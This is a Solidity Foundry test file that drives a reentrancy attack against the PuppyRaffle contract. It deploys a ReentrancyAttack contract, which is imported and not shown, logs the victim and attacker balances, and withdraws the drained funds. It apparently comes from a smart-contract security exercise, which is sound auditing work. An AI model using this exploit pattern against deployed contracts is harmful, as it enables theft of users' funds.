// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";
import {ReentrancyAttack} from "../src/attack/ReentrancyAttack.sol";

contract PuppyRaffleAttackTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;

    address playerOne = address(1);
    address playerTwo = address(2);
    address playerThree = address(3);
    address playerFour = address(4);

    address feeAddress = address(99);
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            feeAddress,
            duration
        );
    }
    
    function test_hello_world() public {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;

        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        ReentrancyAttack attacker = new ReentrancyAttack(puppyRaffle);
        address attackUser = makeAddr("attackUser");
        vm.deal(attackUser, 1 ether);

        uint256 startStringAttackerContractBalance = address(attackUser).balance;
        uint256 startVictimContractBalance = address(puppyRaffle).balance;

        console.log("startStringAttackerContractBalance: %s", startStringAttackerContractBalance);
        console.log("startVictimContractBalance: %s", startVictimContractBalance);

        vm.prank(attackUser);
        attacker.attack{value: entranceFee}();


        uint256 endStringAttackeUserBalance = address(attackUser).balance;
        uint256 endVictimContractBalance = address(puppyRaffle).balance;
        uint256 endAttackerContractBalance = address(attacker).balance;


        console.log("endStringAttackeUserBalance: %s", endStringAttackeUserBalance);
        console.log("endVictimContractBalance: %s", endVictimContractBalance);
        console.log("endAttackerContractBalance: %s", endAttackerContractBalance);

        
        attacker.withdraw();

        console.log("endStringAttackeUserBalance1: %s", address(attackUser).balance);
        console.log("endAttackerContractBalance1: %s", address(attacker).balance);


    }
}